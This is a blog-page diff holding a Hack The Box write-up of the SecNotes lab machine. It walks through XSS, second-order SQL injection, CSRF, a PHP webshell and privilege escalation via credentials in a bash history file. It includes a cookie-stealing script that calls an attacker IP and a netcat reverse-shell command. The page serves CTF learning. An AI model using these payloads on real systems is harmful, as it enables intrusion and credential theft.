@@ -1,0 +1,767 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Secnotes - Hack The Box - hackcommander.io</title>
+<meta name="description" content="This blog post is a writeup of the Hack the Box SecNotes machine from 0xdf.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Secnotes - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-secnotes/">
+
+
+  <meta property="og:description" content="This blog post is a writeup of the Hack the Box SecNotes machine from 0xdf.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-secnotes/secnotes_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2019-01-19T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-secnotes/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Secnotes - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Secnotes - Hack The Box">
+    <meta itemprop="description" content="This blog post is a writeup of the Hack the Box SecNotes machine from 0xdf.">
+    <meta itemprop="datePublished" content="January 19, 2019">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Secnotes - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-01-19T00:00:00+01:00">January 19, 2019 </time>&emsp;
+          
+          
+        </p>
+        <p>This blog post is a writeup of the Hack the Box SecNotes machine from <a href="https://0xdf.gitlab.io">0xdf</a>.</p>
+
+<p>Windows / 10.10.10.97</p>
+
+<p><img src="/assets/images/htb-writeup-secnotes/secnotes_logo.png" alt="" /></p>
+
+<h2 id="summary">Summary</h2>
+
+<ul>
+  <li>The box runs a PHP application on an IIS server.</li>
+  <li>There is a 2nd order SQL injection in the registration page which allows us to dump all the notes from the database. There is also a CSRF that we can leverage to reset the application password by sending a malicous link to a user through the Contact Us form.</li>
+  <li>One of the note contains the credentials for user <code class="language-plaintext highlighter-rouge">Tyler</code>.</li>
+  <li>Using the <code class="language-plaintext highlighter-rouge">Tyler</code> credentials, we can read/write files from the <code class="language-plaintext highlighter-rouge">new-site</code> share, which lets us upload a PHP webshell to the IIS site running on port <code class="language-plaintext highlighter-rouge">8808</code>.</li>
+  <li>We can then get a shell by either uploading and running <code class="language-plaintext highlighter-rouge">nc.exe</code> or using a nishang poweshell oneliner, gaining an initial shell as user <code class="language-plaintext highlighter-rouge">Tyler</code> on the system. I had trouble getting output from <code class="language-plaintext highlighter-rouge">bash</code> using nishang so I eventually had to use netcat instead of nishang.</li>
+  <li>Enumerating the box, we find that the Linux Subsystem is installed.</li>
+  <li>After launching bash, we find in <code class="language-plaintext highlighter-rouge">.bash_history</code> the credentials for the <code class="language-plaintext highlighter-rouge">Administrator</code> user.</li>
+</ul>
+
+<h2 id="detailed-steps">Detailed steps</h2>
+
+<h3 id="nmap-scan">Nmap scan</h3>
+
+<p>Only 3 ports are open, this should make the initial enumeration a bit easier.</p>
+
+<ul>
+  <li>IIS port 80</li>
+  <li>IIS port 8808</li>
+  <li>SMB port 445</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~# nmap -sC -sV -p- 10.10.10.97
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-25 15:10 EDT
+Nmap scan report for 10.10.10.97
+Host is up (0.015s latency).
+Not shown: 65532 filtered ports
+PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+| http-title: Secure Notes - Login
+|_Requested resource was login.php
+445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
+8808/tcp open  http         Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows
+Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h15m41s, deviation: 4h02m31s, median: -4m19s
+| smb-os-discovery: 
+|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
+|   OS CPE: cpe:/o:microsoft:windows_10::-
+|   Computer name: SECNOTES
+|   NetBIOS computer name: SECNOTES\x00
+|   Workgroup: HTB\x00
+|_  System time: 2018-08-25T12:12:28-07:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2018-08-25 15:12:26
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 394.23 seconds
+</code></pre></div></div>
+
+<h3 id="web-enumeration">Web enumeration</h3>
+
+<ul>
+  <li>Port 80 runs a custom SecNotes application</li>
+  <li>Port 8808 doesn’t have anything on it, except the default IIS page (tried enumerating with gobuster and didn’t find anything)</li>
+</ul>
+
+<h3 id="finding-1-we-can-enumerate-user-accounts">Finding #1: We can enumerate user accounts</h3>
+
+<p>The box tells us whether or not a username exists when we attempt to log in.</p>
+
+<p><img src="/assets/images/htb-writeup-secnotes/1.png" alt="" /></p>
+
+<p>I tried fuzzing different usernames with wfuzz but only found the <code class="language-plaintext highlighter-rouge">Tyler</code> username which we already know from the SecNotes application page:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -z file,names.txt -d "username=FUZZ&amp;password=1" --hs "No account found with that username" http://10.10.10.97/login.php
+</code></pre></div></div>
+
+<h3 id="finding-2-reflected-xss-on-the-main-login-page">Finding #2: Reflected XSS on the main login page</h3>
+
+<p>The HTML page returns the username when authentication fails and the input is not properly sanitized so we can trigger an XXS</p>
+
+<p>Example payload in the username field: <code class="language-plaintext highlighter-rouge">"&gt;&lt;script&gt;alert(1);&lt;/script&gt;</code></p>
+
+<p><img src="/assets/images/htb-writeup-secnotes/2.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-writeup-secnotes/3.png" alt="" /></p>
+
+<p>But we won’t be able to do anything useful with this since only our own user sees the error.</p>
+
+<h3 id="finding-3-stored-xss-in-the-notes-applications">Finding #3: Stored XSS in the notes applications</h3>
+
+<p>The notes application doesn’t escape any of the input data so we can embed javascript in the notes and attempt to steal cookies. Unfortunately there is no other user connecting and checking the notes so this is not useful for us here (we can’t steal session cookies of a logged on user).</p>
+
+<p>Payload: <code class="language-plaintext highlighter-rouge">&lt;script&gt;document.write('&lt;img src="http://10.10.14.23:80/collect.gif?cookie=' + document.cookie + '" /&gt;')&lt;/script&gt;</code></p>
+
+<p><img src="/assets/images/htb-writeup-secnotes/4.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-writeup-secnotes/5.png" alt="" /></p>
+
+<h3 id="finding-4-2nd-order-sql-injection-on-the-registration-page">Finding #4: 2nd order SQL injection on the registration page</h3>
+
+<p>There’s an SQL injection vulnerability on the <code class="language-plaintext highlighter-rouge">home.php</code> page that we can abuse by creating a user with the following name: <code class="language-plaintext highlighter-rouge">test' or 1=1-- -</code></p>
+
+<p>Once we log in after, the notes page will display all the notes from all users. The resulting query probably ends up being something like <code class="language-plaintext highlighter-rouge">SELECT * FROM notes WHERE user = 'test' OR 1=1</code> so that basically returns all the notes because of the TRUE condition.</p>
+
+<p>One of the notes contains the credentials for the <code class="language-plaintext highlighter-rouge">Tyler</code> user.</p>
+
+<p><img src="/assets/images/htb-writeup-secnotes/6.png" alt="" /></p>
+
+<h3 id="finding-5-we-can-have-tyler-change-his-password-by-sending-him-a-link">Finding #5: We can have Tyler change his password by sending him a link</h3>
+
+<p>The Change Password page works through a POST request but it also works if we use a GET request instead.</p>
+
+<p>We can send messages to Tyler through the Contact Us form and he’ll click on every link that we send him. Because there is no anti-CSRF token on the Change Password page, we can trick Tyler in changing his password.</p>
+
+<p>Initially, I tried sending an HTML link such as:</p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;a href="http://10.10.10.97/change_pass.php?password=test11&amp;confirm_password=test11&amp;submit=submit"&gt;Click this!&lt;/a&gt;</code> but it didn’t work.</p>
+
+<p>However plaintext works: <code class="language-plaintext highlighter-rouge">http://10.10.10.97/change_pass.php?password=test11&amp;confirm_password=test11&amp;submit=submit</code>.</p>
+
+<p>So we send this to Tyler and we can log in after with the password we specified in the link.</p>
+
+<h3 id="user-shell">User shell</h3>
+
+<p>The credentials for Tyler are in one of the notes:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\\secnotes.htb\new-site
+tyler / 92g!mA8BGjOirkL%OG*&amp;
+</code></pre></div></div>
+
+<p>Let’s verify which shares he has access to:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~/tmp# smbclient -U tyler -L //10.10.10.97
+WARNING: The "syslog" option is deprecated
+Enter WORKGROUP\tyler's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	new-site        Disk      
+
+root@darkisland:~/tmp# smbclient -U tyler //10.10.10.97/new-site
+WARNING: The "syslog" option is deprecated
+Enter WORKGROUP\tyler's password: 
+Try "help" to get a list of possible commands.
+
+smb: \&gt; ls
+  .                                   D        0  Sun Aug 19 14:06:14 2018
+  ..                                  D        0  Sun Aug 19 14:06:14 2018
+  iisstart.htm                        A      696  Thu Jun 21 11:26:03 2018
+  iisstart.png                        A    98757  Thu Jun 21 11:26:03 2018
+
+		12978687 blocks of size 4096. 7919013 blocks available
+</code></pre></div></div>
+
+<p>So the <code class="language-plaintext highlighter-rouge">new-site</code> share is the root directory of the webserver listening on port 8808.</p>
+
+<p>To get a shell on the box we’ll do the following:</p>
+
+<ol>
+  <li>Upload a PHP webshell</li>
+  <li>Upload netcat</li>
+  <li>Run netcat through the webshell</li>
+</ol>
+
+<p>Alternatively we could run nishang to get a reverse shell, but I had problem running <code class="language-plaintext highlighter-rouge">bash</code> and getting the output so netcat it is.</p>
+
+<p>Webshell:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;HTML&gt;&lt;BODY&gt;</span>
+<span class="nt">&lt;FORM</span> <span class="na">METHOD=</span><span class="s">"GET"</span> <span class="na">NAME=</span><span class="s">"myform"</span> <span class="na">ACTION=</span><span class="s">""</span><span class="nt">&gt;</span>
+<span class="nt">&lt;INPUT</span> <span class="na">TYPE=</span><span class="s">"text"</span> <span class="na">NAME=</span><span class="s">"cmd"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;INPUT</span> <span class="na">TYPE=</span><span class="s">"submit"</span> <span class="na">VALUE=</span><span class="s">"Send"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/FORM&gt;</span>
+<span class="nt">&lt;pre&gt;</span>
+<span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="p">{</span>
+  <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
+  <span class="p">}</span>
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;/pre&gt;</span>
+<span class="nt">&lt;/BODY&gt;&lt;/HTML&gt;</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~/tmp# smbclient -U tyler //10.10.10.97/new-site
+WARNING: The "syslog" option is deprecated
+Enter WORKGROUP\tyler's password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; pwd
+Current directory is \\10.10.10.97\new-site\
+smb: \&gt; ls
+  .                                   D        0  Sun Aug 19 14:06:14 2018
+  ..                                  D        0  Sun Aug 19 14:06:14 2018
+  iisstart.htm                        A      696  Thu Jun 21 11:26:03 2018
+  iisstart.png                        A    98757  Thu Jun 21 11:26:03 2018
+
+		12978687 blocks of size 4096. 7919013 blocks available
+smb: \&gt; put snowscan.php
+putting file snowscan.php as \snowscan.php (1.6 kb/s) (average 1.6 kb/s)
+smb: \&gt; put nc.exe
+putting file nc.exe as \nc.exe (152.5 kb/s) (average 91.8 kb/s)
+</code></pre></div></div>
+
+<p>Trigger the netcat connection with: <code class="language-plaintext highlighter-rouge">http://secnotes.htb:8808/snowscan.php?cmd=nc+-e+cmd.exe+10.10.14.23+4444</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~/tmp# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.10.97] 49757
+Microsoft Windows [Version 10.0.17134.228]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\inetpub\new-site&gt;whoami
+whoami
+secnotes\tyler
+
+C:\inetpub\new-site&gt;type c:\users\tyler\desktop\user.txt
+type c:\users\tyler\desktop\user.txt
+6fa755&lt;redacted&gt;
+</code></pre></div></div>
+
+<h3 id="privesc">Privesc</h3>
+
+<p>After looking around the box for a bit, I found that the Linux subsystem is installed. I noticed a Distros directory, Ubuntu then found bash.exe in <code class="language-plaintext highlighter-rouge">C:\Windows\System32</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\&gt;dir
+06/21/2018  03:07 PM    &lt;DIR&gt;          Distros
+[...]
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Distros\Ubuntu&gt;
+ Volume in drive C has no label.
+ Volume Serial Number is 9CDD-BADA
+
+ Directory of C:\Distros\Ubuntu
+
+06/21/2018  05:59 PM    &lt;DIR&gt;          .
+06/21/2018  05:59 PM    &lt;DIR&gt;          ..
+07/11/2017  06:10 PM           190,434 AppxBlockMap.xml
+07/11/2017  06:10 PM             2,475 AppxManifest.xml
+06/21/2018  03:07 PM    &lt;DIR&gt;          AppxMetadata
+07/11/2017  06:11 PM            10,554 AppxSignature.p7x
+06/21/2018  03:07 PM    &lt;DIR&gt;          Assets
+06/21/2018  03:07 PM    &lt;DIR&gt;          images
+07/11/2017  06:10 PM       201,254,783 install.tar.gz
+07/11/2017  06:10 PM             4,840 resources.pri
+06/21/2018  05:51 PM    &lt;DIR&gt;          temp
+07/11/2017  06:10 PM           222,208 ubuntu.exe
+07/11/2017  06:10 PM               809 [Content_Types].xml
+               7 File(s)    201,686,103 bytes
+               6 Dir(s)  32,431,472,640 bytes free
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\System32&gt;dir bash.exe
+06/21/2018  02:02 PM           115,712 bash.exe
+</code></pre></div></div>
+
+<p>After starting bash and looking around the system, we find the <code class="language-plaintext highlighter-rouge">Administrator</code> credentials in root’s <code class="language-plaintext highlighter-rouge">.bash_history</code> file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\System32&gt;bash
+mesg: ttyname failed: Inappropriate ioctl for device
+python -c 'import pty;pty.spawn("/bin/bash")'
+root@SECNOTES:~# cat .bash_history
+cat .bash_history
+cd /mnt/c/
+ls
+cd Users/
+cd /
+cd ~
+ls
+pwd
+mkdir filesystem
+mount //127.0.0.1/c$ filesystem/
+sudo apt install cifs-utils
+mount //127.0.0.1/c$ filesystem/
+mount //127.0.0.1/c$ filesystem/ -o user=administrator
+cat /proc/filesystems
+sudo modprobe cifs
+smbclient
+apt install smbclient
+smbclient
+smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
+&gt; .bash_history 
+less .bash_history
+</code></pre></div></div>
+
+<p>We can then psexec as administrator and get the root flag:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkstar:~# /usr/share/doc/python-impacket/examples/psexec.py 'administrator:u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97 cmd.exe
+Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
+
+[*] Requesting shares on 10.10.10.97.....
+[*] Found writable share ADMIN$
+[*] Uploading file DmaHNXRy.exe
+[*] Opening SVCManager on 10.10.10.97.....
+[*] Creating service twnE on 10.10.10.97.....
+[*] Starting service twnE.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17134.228]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32&gt;type c:\users\administrator\desktop\root.txt
+7250cd&lt;redacted&gt;
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#csrf" class="page__taxonomy-item" rel="tag">csrf</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#sqli" class="page__taxonomy-item" rel="tag">sqli</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">windows</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#wsl" class="page__taxonomy-item" rel="tag">wsl</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-01-19T00:00:00+01:00">January 19, 2019</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-oz/" class="pagination--pager" title="Oz - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-ypuffy/" class="pagination--pager" title="Ypuffy - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
